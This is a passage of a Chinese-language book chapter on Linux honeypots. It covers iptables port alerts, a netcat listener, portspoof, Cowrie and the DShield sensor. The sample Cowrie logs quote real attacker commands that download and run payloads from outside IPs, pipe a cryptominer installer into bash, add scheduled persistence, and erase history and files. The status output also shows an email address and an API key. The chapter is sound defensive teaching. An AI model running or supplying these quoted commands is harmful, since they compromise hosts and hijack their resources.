# 第十四章：*第十四章*：Linux 上的蜜罐服务

在本章中，我们将讨论蜜罐 - 您可以部署以收集攻击者活动的虚假服务，其误报率几乎为零。我们将讨论各种架构和放置选项，以及部署蜜罐的风险。还将讨论几种不同的蜜罐架构。本章应该让您开始实施各种网络上的“欺骗”方法，以分散和延迟攻击者，并提供几乎没有误报的攻击者活动的高保真日志。

在本章中，我们将讨论以下主题：

+   蜜罐概述 - 什么是蜜罐，我为什么要一个？

+   部署方案和架构 - 我应该把蜜罐放在哪里？

+   部署蜜罐的风险

+   示例蜜罐

+   分布/社区蜜罐 - 互联网风暴中心的 DShield 蜜罐项目

# 技术要求

本章讨论的所有蜜罐选项都可以直接部署在本书中一直使用的示例 Linux 主机上，或者在该主机 VM 的副本上。来自互联网风暴中心的最终示例蜜罐可能是您选择放在不同的专用主机上的蜜罐。特别是，如果您计划将此服务放在互联网上，我建议您选择一个可以随时删除的专用主机。

# 蜜罐概述 - 什么是蜜罐，我为什么要一个？

蜜罐服务器本质上是一个假服务器 - 一种呈现为*真实*服务器的东西，但除了记录和警报任何连接活动之外，没有任何数据或功能。

为什么您想要这样的东西？还记得[*第十三章*]（B16336_13_Final_NM_ePub.xhtml#_idTextAnchor236）中的*Linux 上的入侵防范系统*，当我们处理误报警报时吗？这些警报报告了一次攻击，但实际上是由正常活动触发的。嗯，蜜罐通常只发送您可以称之为“高保真”警报。如果蜜罐触发了，要么是因为真正的攻击者行为，要么是配置错误。

例如，您可能在服务器的 VLAN 中设置了一个蜜罐 SQL 服务器。该服务器将在端口`1433/tcp`（SQL）上进行监听，可能还会在端口`3389/tcp`（远程桌面）上进行监听。由于它不是一个真正的 SQL 服务器，它不应该（绝对不应该）在任何一个端口上看到连接。如果它确实看到了连接，要么是有人在网络上进行了不应该进行的探测，要么是一个有效的攻击。顺便说一句 - 渗透测试几乎总是会很快触发蜜罐，因为它们会扫描各种子网以寻找常见服务。

也就是说，在许多攻击中，您只有很短的时间来隔离和驱逐攻击者，以免造成不可挽回的损害。蜜罐能帮上忙吗？简短的答案是肯定的。蜜罐有几种形式：

![](img/B16336_14_Table_01.jpg)

这些情景通常适用于内部蜜罐和已经在您网络上的攻击者。在这些情况下，攻击者已经侵入了您网络上的一个或多个主机，并试图向更有价值的主机和服务（以及数据）“攀升”。在这些情况下，您对攻击者的平台有一定程度的控制 - 如果是一个受损的主机，您可以将其脱机并重建，或者如果是攻击者的物理主机（例如在无线网络受损后），您可以将其踢出网络并修复其访问方法。

另一个完全不同的场景是用于研究。例如，您可以在公共互联网上放置一个蜜罐 Web 服务器，以监视各种攻击的趋势。这些趋势通常是安全社区的第一个指标，表明存在新的漏洞 - 我们将看到攻击者试图利用特定平台上的 Web 服务漏洞，这是我们以前从未见过的。或者您可能会看到针对 Web 或 SSH 服务器的身份验证服务的攻击，使用新帐户，这可能表明出现了新的恶意软件或者可能是某个新服务遭受了涉及其订户凭据的违规行为。因此，在这种情况下，我们不是在保护我们的网络，而是在监视可以用来保护每个人网络的新的敌对活动。

蜜罐并不仅限于网络服务。越来越常见的是以相同的方式使用数据和凭据。例如，您可能有一些具有“吸引人”名称的文件，当它们被打开时会触发警报 - 这可能表明您有内部攻击者（当然要记录 IP 地址和用户 ID）。或者您可能在系统中有“虚拟”帐户，如果尝试访问它们，则会触发警报 - 这些可能再次用于发现攻击者何时进入环境。或者您可能会对关键数据进行“水印”，以便如果它在您的环境之外被看到，您将知道您的组织已经遭到入侵。所有这些都利用了相同的思维方式 - 拥有一组高保真度的警报，当攻击者访问吸引人的服务器、帐户甚至吸引人的文件时触发。

现在您知道了什么是蜜罐服务器以及为什么您可能需要一个，让我们进一步探讨一下，在您的网络中您可能选择放置一个蜜罐。

# 部署场景和架构 - 我应该把蜜罐放在哪里？

在内部网络上使用蜜罐的一个很好的用途是简单地监视常常受到攻击的端口的连接请求。在典型组织的内部网络中，攻击者可能会在他们的第一组“让我们探索网络”的扫描中扫描一小部分端口。如果您看到对不正当托管该服务的服务器的任何这些连接请求，那就是一个非常高保真度的警报！这几乎可以肯定地表明存在恶意活动！

你可能要观察哪些端口？一个合理的起始列表可能包括：

![](img/B16336_14_Table_03.jpg)

当然，列表还在继续 - 非常常见的是根据您的环境中实际运行的服务来定制您的蜜罐服务。例如，制造工厂或公用事业设施可能会建立伪装为**监控和数据采集**（**SCADA**）或**工业控制系统**（**ICS**）服务的蜜罐。

从我们的列表中，如果您试图向攻击者模拟 SQL 服务器，您可能会让您的蜜罐监听 TCP 端口`445`和`1433`。您不希望监听太多端口。例如，如果您的服务器监听了上表中的所有端口，那么这立即向您的攻击者传达了“这是一个蜜罐”的信息，因为这些端口几乎不会同时出现在单个生产主机上。这也告诉您的攻击者修改他们的攻击方式，因为现在他们知道您有蜜罐，并且可能正在监视蜜罐活动。

那么，我们应该把蜜罐放在哪里？过去，拥有蜜罐服务器更多是系统管理员对安全感兴趣的“运动”，他们会在互联网上放置 SSH 蜜罐，只是为了看看人们会做什么。这些日子已经过去了，现在直接放在互联网上的任何东西都会每天 - 或每小时或每分钟，取决于他们是什么类型的组织以及提供了什么服务 - 见到几次攻击。

在现代网络中我们在哪里看到蜜罐？您可能会在 DMZ 中放置一个。

![图 14.1 – 在 DMZ 中的蜜罐](img/B16336_14_001.jpg)

图 14.1 - DMZ 中的蜜罐

然而，这只是简单地检测互联网攻击，其用处有限 - 互联网攻击几乎是持续不断的，正如我们在[*第十三章*]（B16336_13_Final_NM_ePub.xhtml#_idTextAnchor236）中讨论的那样，*Linux 上的入侵防范系统*。更常见的是，我们会在内部子网上看到蜜罐：

![图 14.2 - 内部网络中的蜜罐](img/B16336_14_002.jpg)

图 14.2 - 内部网络中的蜜罐

这种方法是几乎 100%准确地检测内部攻击的好方法。您在临时或定期基础上进行的任何内部扫描当然都会被检测到，但除此之外，这些蜜罐的所有检测应该都是合法的攻击，或者至少值得调查的活动。

公共互联网上的研究蜜罐允许收集各种攻击趋势。此外，这些通常还允许您将您的攻击概况与综合攻击数据进行比较。

![图 14.3 - 公共互联网上的“研究”蜜罐](img/B16336_14_003.jpg)

图 14.3 - 公共互联网上的“研究”蜜罐

现在我们已经了解了部署各种类型的蜜罐所涉及的各种架构，以及为什么我们可能希望或需要其中之一，那么在部署这些类型的“欺骗主机”时涉及哪些风险呢？

# 部署蜜罐的风险

众所周知，蜜罐的作用是检测攻击者，因此很可能会看到它们被成功攻击和 compromise。特别是最后一个例子，您将服务暴露给互联网是一个相当冒险的游戏。如果攻击者成功攻击了您的蜜罐，他们不仅可以在您的网络中立足，而且现在可以控制该蜜罐发送的警报，而您很可能依赖这些警报来检测攻击。也就是说，明智的做法是始终计划妥协，并随时准备好应对措施：

+   如果您的蜜罐面向公共互联网，请将其放置在 DMZ 中，以确保该段对您其他生产主机没有访问权限。

+   如果您的蜜罐位于内部网络中，您可能仍希望将其放置在 DMZ 中，并进行 NAT 条目，使其看起来像是在内部网络中。或者，**私有 VLAN**（PVLAN）也可以很好地适用于此位置。

+   只允许蜜罐服务所需的出站活动。

+   对蜜罐进行镜像，以便如果需要从头开始恢复它，您是从已知的良好镜像中进行恢复，而不是从头重新安装 Linux 等。利用虚拟化在这里可以帮助很大 - 恢复蜜罐服务器应该只需要几分钟或几秒钟。

+   将所有蜜罐活动记录到一个中央位置。随着时间的推移，您可能会发现您可能会在各种情况下部署多个蜜罐。中央日志记录允许您配置中央警报，所有这些都是您的攻击者可能最终会妥协的主机。有关中央日志记录的方法和保护这些日志服务器，请参阅[*第十二章*]（B16336_12_Final_NM_ePub.xhtml#_idTextAnchor216），*使用 Linux 进行网络监控*。

+   定期轮换蜜罐镜像 - 除了本地日志之外，蜜罐本身不应该有任何长期的值得注意的数据，因此如果您有良好的主机恢复机制，自动定期重新映像您的蜜罐是明智的选择。

在考虑架构和这个警告的基础上，让我们讨论一些常见的蜜罐类型，从基本的端口警报方法开始。

# 示例蜜罐

在本节中，我们将讨论构建和部署各种蜜罐解决方案。我们将介绍如何构建它们，您可能希望将它们放置在何处以及原因。我们将重点讨论以下内容：

+   基本的“TCP 端口”蜜罐，我们会对攻击者的端口扫描和对我们各种服务的连接尝试进行警报。我们将讨论这些警报，没有开放端口（因此攻击者不知道他们触发了警报），以及作为实际开放端口服务，这将减慢攻击者的速度。

+   预先构建的蜜罐应用程序，包括开源和商业应用。

+   互联网风暴中心的 DShield 蜜罐，既分布式又基于互联网。

让我们开始吧，首先尝试几种不同的方法来建立“开放端口”蜜罐主机。

## 基本的端口警报蜜罐-iptables、netcat 和 portspoof

在 Linux 中，基本的端口连接请求很容易捕捉到，甚至不需要一个监听端口！因此，不仅可以在内部网络上捕捉到恶意主机，而且它们根本看不到任何开放的端口，因此无法得知你已经“拍摄”了它们。

为了做到这一点，我们将使用`iptables`来监视任何给定端口的连接请求，然后在发生时记录它们。这个命令将监视对端口`8888/tcp`的连接请求（`SYN`数据包）：

```
$ sudo iptables -I INPUT -p tcp -m tcp --dport 8888 -m state --state NEW  -j LOG --log-level 1 --log-prefix "HONEYPOT - ALERT PORT 8888"
```

我们可以很容易地使用`nmap`（从远程机器）来测试这一点-请注意端口实际上是关闭的：

```
$ nmap -Pn -p8888 192.168.122.113
Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-09 10:29 Eastern Daylight Time
Nmap scan report for 192.168.122.113
Host is up (0.00013s latency).
PORT     STATE  SERVICE
8888/tcp closed sun-answerbook
MAC Address: 00:0C:29:33:2D:05 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 5.06 seconds
```

现在我们可以检查日志：

```
$ cat /var/log/syslog | grep HONEYPOT
Jul  9 10:29:49 ubuntu kernel: [  112.839773] HONEYPOT - ALERT PORT 8888IN=ens33 OUT= MAC=00:0c:29:33:2d:05:3c:52:82:15:52:1b:08:00 SRC=192.168.122.201 DST=192.168.122.113 LEN=44 TOS=0x00 PREC=0x00 TTL=41 ID=42659 PROTO=TCP SPT=44764 DPT=8888 WINDOW=1024 RES=0x00 SYN URGP=0
robv@ubuntu:~$ cat /var/log/kern.log | grep HONEYPOT
Jul  9 10:29:49 ubuntu kernel: [  112.839773] HONEYPOT - ALERT PORT 8888IN=ens33 OUT= MAC=00:0c:29:33:2d:05:3c:52:82:15:52:1b:08:00 SRC=192.168.122.201 DST=192.168.122.113 LEN=44 TOS=0x00 PREC=0x00 TTL=41 ID=42659 PROTO=TCP SPT=44764 DPT=8888 WINDOW=1024 RES=0x00 SYN URGP=0
```

参考*第十二章*，*使用 Linux 进行网络监控*，从这里开始很容易记录到远程 syslog 服务器并对任何出现`HONEYPOT`一词的情况进行警报。我们可以扩展这个模型，包括任意数量的有趣端口。

如果你想要打开端口并进行警报，你可以使用`netcat`来做到这一点-甚至可以通过添加横幅来“装饰”它：

```
#!/bin/bash
PORT=$1
i=1
HPD='/root/hport'
if [ ! -f $HPD/$PORT.txt ]; then
    echo $PORT >> $HPD/$PORT.txt
fi
BANNER='cat $HPD/$PORT.txt'
while true;
    do
    echo "................................." >> $HPD/$PORT.log;
    echo -e $BANNER | nc -l $PORT -n -v 1>> $HPD/$PORT.log 2>> $HPD/$PORT.log;
    echo "Connection attempt - Port: $PORT at" 'date';
    echo "Port Connect at:" 'date' >> $HPD/$PORT.log;
done
```

因为我们正在监听任意端口，所以你需要以 root 权限运行这个脚本。还要注意，如果你想要一个特定的横幅（例如，端口`3389/tcp`的 RDP 或`1494/tcp`的 ICA），你需要创建这些横幅文件，命令如下：

```
echo RDP > 3389.txt
The output as your attacker connects will look like:
# /bin/bash ./hport.sh 1433
Connection attempt - Port: 1433 at Thu 15 Jul 2021 03:04:32 PM EDT
Connection attempt - Port: 1433 at Thu 15 Jul 2021 03:04:37 PM EDT
Connection attempt - Port: 1433 at Thu 15 Jul 2021 03:04:42 PM EDT
```

日志文件将如下所示：

```
$ cat 1433.log
.................................
Listening on 0.0.0.0 1433
.................................
Listening on 0.0.0.0 1433
Connection received on 192.168.122.183 11375
Port Connect at: Thu 15 Jul 2021 03:04:32 PM EDT
.................................
Listening on 0.0.0.0 1433
Connection received on 192.168.122.183 11394
Port Connect at: Thu 15 Jul 2021 03:04:37 PM EDT
.................................
Listening on 0.0.0.0 1433
Connection received on 192.168.122.183 11411
Port Connect at: Thu 15 Jul 2021 03:04:42 PM EDT
.................................
Listening on 0.0.0.0 1433
```

更好的方法是使用一个由某人维护的实际软件包，可以监听多个端口。你可以在 Python 中快速编写监听特定端口的代码，然后为每个连接记录一个警报。或者你可以利用其他人已经完成的工作，也已经进行了调试，这样你就不必自己动手了！

Portspoof 就是这样一个应用程序-你可以在[`github.com/drk1wi/portspoof`](https://github.com/drk1wi/portspoof)找到它。

Portspoof 使用的是“老派”Linux 安装；也就是说，将你的目录更改为`portspoof`下载目录，然后按顺序执行以下命令：

```
# git clone  https://github.com/drk1wi/portspoof
# cd portspoof
# Sudo ./configure
# Sudo Make
# Sudo Make install
```

这将把 Portspoof 安装到`/usr/local/bin`，配置文件在`/usr/local/etc`。

查看`/usr/local/etc/portspoof.conf`，使用`more`或`less`-你会发现它有很好的注释，并且很容易修改以满足你的需求。

默认情况下，这个工具在安装后立即可以使用。首先，我们将使用`iptables`重定向我们想要监听的所有端口，并将它们指向`4444/tcp`端口，这是`portspoof`的默认端口。请注意，你需要`sudo`权限来执行这个`iptables`命令：

```
# iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80:90 -j REDIRECT --to-ports 4444
```

接下来，只需运行`portspoof`，使用默认的签名和配置：

```
$ portspoof -v -l /some/path/portspoof.log –c /usr/local/etc/portspoof.conf –s /usr/local/etc/portspoof_signatures
```

现在我们将扫描一些重定向的端口，一些是重定向的，一些不是-请注意我们正在使用`banner.nse`收集服务“横幅”，而`portspoof`已经为我们预先配置了一些横幅。

```
nmap -sT -p 78-82 192.168.122.113 --script banner
Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-15 15:44 Eastern Daylight Time
Nmap scan report for 192.168.122.113
Host is up (0.00020s latency).
PORT   STATE    SERVICE
78/tcp filtered vettcp
79/tcp filtered finger
80/tcp open     http
| banner: HTTP/1.0 200 OK\x0D\x0AServer: Apache/IBM_Lotus_Domino_v.6.5.1\
|_x0D\x0A\x0D\x0A--<html>\x0D\x0A--<body><a href="user-UserID">\x0D\x0...
81/tcp open     hosts2-ns
| banner: <pre>\x0D\x0AIP Address: 08164412\x0D\x0AMAC Address: \x0D\x0AS
|_erver Time: o\x0D\x0AAuth result: Invalid user.\x0D\x0A</pre>
82/tcp open     xfer
| banner: HTTP/1.0 207 s\x0D\x0ADate: r\x0D\x0AServer: FreeBrowser/146987
|_099 (Win32)
MAC Address: 00:0C:29:33:2D:05 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

回到`portspoof`屏幕，我们会看到以下内容：

```
$ portspoof -l ps.log -c ./portspoof.conf  -s ./portspoof_signatures
-> Using log file ps.log
-> Using user defined configuration file ./portspoof.conf
-> Using user defined signature file ./portspoof_signatures
Send to socket failed: Connection reset by peer
Send to socket failed: Connection reset by peer
Send to socket failed: Connection reset by peer
The logfile looks like this:
$ cat /some/path/ps.log
1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:80
1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:82
1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:81
```

你也可以从 syslog 中获取`portspoof`的条目。信息是一样的，但时间戳是以 ASCII 格式而不是“自纪元开始以来的秒数”格式：

```
$ cat /var/log/syslog | grep portspoof
Jul 15 15:48:02 ubuntu portspoof[26214]:  1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:80
Jul 15 15:48:02 ubuntu portspoof[26214]:  1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:82
Jul 15 15:48:02 ubuntu portspoof[26214]:  1626378481 # Service_probe # SIGNATURE_SEND # source_ip:192.168.122.183 # dst_port:81
```

最后，如果是时候关闭`portspoof`，你需要删除我们放入的 NAT 条目，将你的 Linux 主机恢复到对这些端口的原始处理方式。

```
$ sudo iptables -t nat -F
```

但是，如果我们想要更复杂的东西呢？我们当然可以使我们自己构建的蜜罐变得越来越复杂和逼真，以欺骗攻击者，或者我们可以购买更完整的产品，提供完整的报告和支持。

## 其他常见的蜜罐

在公共方面，您可以使用**Cowrie** ([`github.com/cowrie/cowrie`](https://github.com/cowrie/cowrie))，这是由*Michel Oosterhof*维护的 SSH 蜜罐。这可以配置成像一个真实的主机 - 当然，游戏的目标是浪费攻击者的时间，以便让您有时间将他们从您的网络中驱逐出去。在这个过程中，您可以了解到他们的技能水平，并且通常可以得知他们在攻击中实际试图达到的目标。

**WebLabyrinth** ([`github.com/mayhemiclabs/weblabyrinth`](https://github.com/mayhemiclabs/weblabyrinth)) 由*Ben Jackson*提供了一个永无止境的网页系列，用作 Web 扫描器的“粘陷”。再次强调目标是一样的 - 浪费攻击者的时间，并在攻击过程中尽可能多地获取有关他们的情报。

**Thinkst Canary** ([`canary.tools/`](https://canary.tools/) and [`thinkst.com/`](https://thinkst.com/)) 是一种商业解决方案，在提供的细节和完整性方面非常彻底。事实上，该产品的详细程度允许您建立一个完整的“诱饵数据中心”或“诱饵工厂”。它不仅可以让您愚弄攻击者，而且往往欺骗到了他们认为他们实际上正在通过生产环境进行进展的程度。

让我们离开内部网络和相关的内部和 DMZ 蜜罐，看看面向研究的蜜罐。

# 分布/社区蜜罐 - 互联网风暴中心的 DShield 蜜罐项目

首先，从您的主机获取当前日期和时间。任何严重依赖日志的活动都需要准确的时间：

```
# date
Fri 16 Jul 2021 03:00:38 PM EDT
```

如果您的日期/时间不准确或配置不可靠，您将希望在开始之前修复它 - 这对于任何操作系统中的任何服务都是真实的。

现在，切换到一个安装目录，然后使用`git`下载应用程序。如果您没有`git`，请使用本书中一直使用的标准`sudo apt-get install git`来获取它。一旦安装了`git`，这个命令将在当前工作目录下创建一个`dshield`目录：

```
git clone https://github.com/DShield-ISC/dshield.git
```

接下来，运行`install`脚本：

```
cd dshield/bin
sudo ./install.sh
```

在这个过程中，会有几个输入屏幕。我们将在这里介绍一些关键的屏幕：

1.  首先，我们有一个标准警告，即蜜罐日志当然会包含敏感信息，既来自您的环境，也来自攻击者！[](img/B16336_14_004.jpg)

图 14.4 - 关于敏感信息的警告

1.  下一个安装屏幕似乎表明这是在 Raspberry Pi 平台上安装。不用担心，虽然这是这个防火墙的一个非常常见的平台，但它也可以安装在大多数常见的 Linux 发行版上。![图 14.5 - 关于安装和支持的第二个警告](img/B16336_14_005.jpg)

图 14.5 - 关于安装和支持的第二个警告

1.  接下来，我们得到另一个警告，表明您收集的数据将成为互联网风暴中心的 DShield 项目的一部分。当它被合并到更大的数据集中时，您的数据会被匿名化，但如果您的组织没有准备好共享安全数据，那么这种类型的项目可能不适合您：![图 14.6 - 关于数据共享的第三次安装警告](img/B16336_14_006.jpg)

图 14.6 - 关于数据共享的第三次安装警告

1.  您将被问及是否要启用自动更新。这里的默认设置是启用这些更新 - 只有在您有一个非常好的理由时才禁用它们。![图 14.7 - 更新的安装选择](img/B16336_14_007.jpg)

图 14.7 - 更新的安装选择

1.  您将被要求输入您的电子邮件地址和 API 密钥。这用于数据提交过程。您可以通过登录[`isc.sans.edu`](https://isc.sans.edu)网站并查看您的账户状态来获取 API 密钥：图 14.8 - 上传数据的凭据输入

图 14.8 - 上传数据的凭据输入

1.  您还将被问及您希望蜜罐监听哪个接口。在这些情况下，通常只有一个接口 - 您绝对不希望您的蜜罐绕过防火墙控制！图 14.9 - 接口选择

图 14.9 - 接口选择

1.  您将被要求输入 HTTPS 蜜罐的证书信息 - 如果您希望您的传感器对攻击者来说有些匿名性，您可能会选择在这些字段中输入虚假信息。在这个例子中，我们展示了大部分合法的信息。请注意，此时 HTTPS 蜜罐尚未实施，但正在规划阶段。图 14.10 - 证书信息

。

图 14.10 - 证书信息

1.  您将被问及是否要安装**证书颁发机构**（**CA**）。在大多数情况下，在这里选择**是**是有意义的 - 这将在 HTTPS 服务上安装自签名证书。图 14.11 - 是否需要 CA？

图 14.11 - 是否需要 CA？

1.  最终屏幕重新启动主机，并通知您实际的 SSH 服务将更改到不同的端口。

图 14.12 - 最终安装屏幕

图 14.12 - 最终安装屏幕

重启后，检查蜜罐的状态。请注意，传感器安装在`/srv/dshield`中：

```
$ sudo /srv/dshield/status.sh
[sudo] password for hp01:
#########
###
### DShield Sensor Configuration and Status Summary
###
#########
Current Time/Date: 2021-07-16 15:27:00
API Key configuration ok
Your software is up to date.
Honeypot Version: 87
###### Configuration Summary ######
E-mail : rob@coherentsecurity.com
API Key: 4BVqN8vIEDjWxZUMziiqfQ==
User-ID: 948537238
My Internal IP: 192.168.122.169
My External IP: 99.254.226.217
###### Are My Reports Received? ######
Last 404/Web Logs Received:
Last SSH/Telnet Log Received:
Last Firewall Log Received: 2014-03-05 05:35:02
###### Are the submit scripts running?
Looks like you have not run the firewall log submit script yet.
###### Checking various files
OK: /var/log/dshield.log
OK: /etc/cron.d/dshield
OK: /etc/dshield.ini
OK: /srv/cowrie/cowrie.cfg
OK: /etc/rsyslog.d/dshield.conf
OK: firewall rules
ERROR: webserver not exposed. check network firewall
```

此外，为了确保您的报告已提交，一两个小时后请检查[`isc.sans.edu/myreports.html`](https://isc.sans.edu/myreports.html)（您需要登录）。

状态检查中显示的错误是此主机尚未连接到互联网 - 这将是我们的下一步。在我的情况下，我将把它放在一个 DMZ 中，只允许对端口`22/tcp`，`80/tcp`和`443/tcp`进行入站访问。做出这些更改后，我们的状态检查现在通过了：

```
###### Checking various files
OK: /var/log/dshield.log
OK: /etc/cron.d/dshield
OK: /etc/dshield.ini
OK: /srv/cowrie/cowrie.cfg
OK: /etc/rsyslog.d/dshield.conf
OK: firewall rules
OK: webserver exposed
```

当浏览器指向蜜罐的地址时，他们将看到这个：

图 14.13 - 从浏览器中看到的 ISC 网络蜜罐

图 14.13 - 从浏览器中看到的 ISC 网络蜜罐

在蜜罐服务器本身上，您可以看到各种登录会话，攻击者可以访问假的 SSH 和 Telnet 服务器。在`/srv/cowrie/var/log/cowrie`中，文件是`cowrie.json`和`cowrie.log`（以及以前几天的日期版本）：

```
$ pwd
/srv/cowrie/var/log/cowrie
$ ls
cowrie.json             cowrie.json.2021-07-18  cowrie.log.2021-07-17
cowrie.json.2021-07-16  cowrie.log              cowrie.log.2021-07-18
cowrie.json.2021-07-17  cowrie.log.2021-07-16
```

当然，`JSON`文件是为您编写代码而格式化的。例如，Python 脚本可能会获取这些信息并将其提供给 SIEM 或其他"下一阶段"的防御工具。

然而，文本文件很容易阅读 - 您可以使用`more`或`less`（Linux 中常见的两个文本查看应用程序）打开它。让我们看一些有趣的日志条目。

以下代码块显示了启动新会话 - 请注意日志条目中的协议和源 IP。在 SSH 会话中，您还将在日志中看到各种 SSH 加密参数：

```
2021-07-19T00:04:26.774752Z [cowrie.telnet.factory.HoneyPotTelnetFactory] New co
nnection: 27.213.102.95:40579 (192.168.126.20:2223) [session: 3077d7bc231f]
2021-07-19T04:04:20.916128Z [cowrie.telnet.factory.HoneyPotTelnetFactory] New co
nnection: 116.30.7.45:36673 (192.168.126.20:2223) [session: 18b3361c21c2]
2021-07-19T04:20:01.652509Z [cowrie.ssh.factory.CowrieSSHFactory] New connection
: 103.203.177.10:62236 (192.168.126.20:2222) [session: 5435625fd3c2]
```

我们还可以查找各种攻击者尝试运行的命令。在这些示例中，他们试图下载额外的 Linux 工具，因为蜜罐似乎缺少一些工具，或者可能是一些恶意软件以持续运行：

```
2021-07-19T02:31:55.443537Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,5,141.98.10.56] Command found: wget http://142.93.105.28/a
2021-07-17T11:44:11.929645Z [CowrieTelnetTransport,4,58.253.13.80] CMD: cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://58.253.13.80:60232/i; curl -O http://58.253.13.80:60232/i; /bin/busybox wget http://58.253.13.80:60232/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
2021-07-18T07:12:02.082679Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,33,209.141.53.60] executing command "b'cd /tmp || cd
 /var/run || cd /mnt || cd /root || cd /; wget http://205.185.126.121/8UsA.sh; curl -O http://205.185.126.121/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 205.185.126.121 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 205.185.126.121; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p
anonymous -P 21 205.185.126.121 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *'"
```

请注意，第一个攻击者在最后发送了一个 ASCII 字符串，以十六进制表示为`'\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'`，这意味着"connected"。这可能是为了规避入侵防御系统。Base64 编码是另一种常见的规避技术，在蜜罐日志中也会看到。

第二个攻击者有一系列`rm`命令，用于在完成目标后清理他们的各种工作文件。

请注意，您在 SSH 日志中可能会看到的另一件事是语法错误。通常这些错误来自未经充分测试的脚本，但一旦会话更频繁地建立，您将看到真正的人在键盘上操作，因此您将从任何错误中得到一些关于他们的技能水平（或者他们所在时区的深夜程度）的指示。

在接下来的例子中，攻击者试图下载加密货币挖矿应用程序，将他们新受损的 Linux 主机添加到他们的加密货币挖矿“农场”中：

```
2021-07-19T02:31:55.439658Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,5,141.98.10.56] executing command "b'curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7 bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; wget http://142.93.105.28/a; chmod 777 a; ./a; rm -rfa ; history -c'"
2021-07-19T04:28:49.356339Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,9,142.93.97.193] executing command "b'curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7 bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; wget http://142.93.105.28/a; chmod 777 a; ./a; rm -rfa; history -c'"
```

请注意，他们都在他们的命令中添加了一个`history –c`附录，用于清除当前会话的交互式历史记录，以隐藏攻击者的活动。

在这个例子中，攻击者试图将恶意软件下载添加到 Linux 调度程序 cron 中，以便他们可以保持持久性 - 如果他们的恶意软件被终止或删除，它将在下一个计划任务到来时重新下载并重新安装：

```
2021-07-19T04:20:03.262591Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,4,103.203.177.10] executing command "b'/system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://bestony.club/poll/24eff58f-9d8a-43ae-96de-71c95d9e6805 mode=http dst-path=7wmp0b4s.rsc\\r\\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write'"
```

攻击者试图下载的各种文件都被收集在`/srv/cowrie/var/lib/cowrie/downloads`目录中。

您可以自定义 Cowrie 诱饵 - 您可能会进行的一些常见更改位于以下位置：

![](img/B16336_14_Table_04.jpg)

还有什么？只需在线检查您的 ISC 账户 - 您可能会感兴趣的链接位于**我的账户**下：

![图 14.14 – ISC 诱饵 – 在线报告](img/B16336_14_014.jpg)

图 14.14 – ISC 诱饵 – 在线报告

让我们稍微详细讨论一下这些选项：

![](img/B16336_14_Table_05.jpg)

在线，针对您的诱饵的 SSH 活动在 ISC 门户网站下的**我的 SSH 报告**中进行了总结：

![图 14.15 – SSH 诱饵报告](img/B16336_14_015.jpg)

图 14.15 – SSH 诱饵报告

目前，SSH 汇总数据的主要报告涉及使用的用户 ID 和密码：

![图 14.16 – ISC SSH 报告 – 观察到的用户 ID 和密码](img/B16336_14_016.jpg)

图 14.16 – ISC SSH 报告 – 观察到的用户 ID 和密码

所有活动都被记录下来，因此我们确实会不时地看到针对这些攻击数据的研究项目，并且各种报告随着时间的推移而得到完善。

Web 诱饵与 SSH 诱饵有类似的配置。各种攻击的检测在`/srv/www/etc/signatures.xml`文件中更新。这些定期从互联网风暴中心的中央服务器更新，所以虽然您可以自己进行本地编辑，但这些更改很可能会在下一次更新时被“覆盖”。

当然，对诱饵的 Web 活动也都被记录下来。本地日志存储在`/srv/www/DB/webserver.sqlite`数据库中（以 SQLite 格式）。本地日志也可以在`/var/log/syslog`中通过搜索`webpy`字符串找到。

在示例诱饵中检测到的各种事物包括以下攻击者，他正在寻找 HNAP 服务。HNAP 是一个经常受到攻击的协议，通常用于控制 ISP 调制解调器的车队（[`isc.sans.edu/diary/More+on+HNAP+-+What+is+it%2C+How+to+Use+it%2C+How+to+Find+it/17648`](https://isc.sans.edu/diary/More+on+HNAP+-+What+is+it%2C+How+to+Use+it%2C+How+to+Find+it/17648)），因此 HNAP 的妥协通常会导致大量设备的妥协：

```
Jul 19 06:03:08 hp01 webpy[5825]: 185.53.90.19 - - [19/Jul/2021 05:34:09] "POST /HNAP1/ HTTP/1.1" 200 –
```

同一个攻击者还在探测`goform/webLogin`。在这个例子中，他们正在测试常见 Linksys 路由器上的最新漏洞：

```
